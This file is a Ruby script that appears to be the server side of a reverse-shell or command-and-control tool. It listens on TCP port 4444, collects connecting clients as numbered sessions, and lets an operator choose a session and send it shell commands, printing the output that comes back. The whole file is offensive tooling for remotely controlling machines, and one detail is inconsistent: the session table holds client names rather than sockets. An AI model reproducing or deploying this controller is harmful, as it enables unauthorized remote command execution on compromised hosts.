#!/usr/bin/env ruby
require 'socket'
require './core'
include MainCommands
def main_shell()
	main = [(print ("main> ")), $stdin.gets.rstrip][1]
	main_shell() if main == ''
	list_sessions(@clients) if main == 'list_sessions'
	help() if main == 'help'
	exit if main == 'exit'
	if main.split(' ')[0] == 'use_session'
		session_id = main.split(' ')[1]
		use_session(@clients[:"#{session_id}"])
	end
end
def command_client(client)
	loop {
		command = [(print ("shell> ")), $stdin.gets.rstrip][1]
		command_client(client) if command == ''
		client.print("#{command}")
		exit if command == 'exit'		
		background if command == 'background'
		out_put = ''
		recv_length = 1024
		while (tmp = client.recv(recv_length))
			out_put += tmp
			break if tmp.length < recv_length
		end
		puts out_put.chomp
	}
end
begin
	@clients = {}
	client_id = "0"
	server = TCPServer.open(4444)
  Thread.new {
    loop {
      Thread.start(server.accept) do |client|  
		    client_name = client.recv(1024)
			  print_success("#{client_name}\n")
			  @clients[:"#{client_id}"] = client_name
			  client_id = client_id.to_i
			  client_id += 1
			  client_id = client_id.to_s
		  end
     }
	}
  main_shell()
	rescue => error
    print_error("#{error}\n")
end
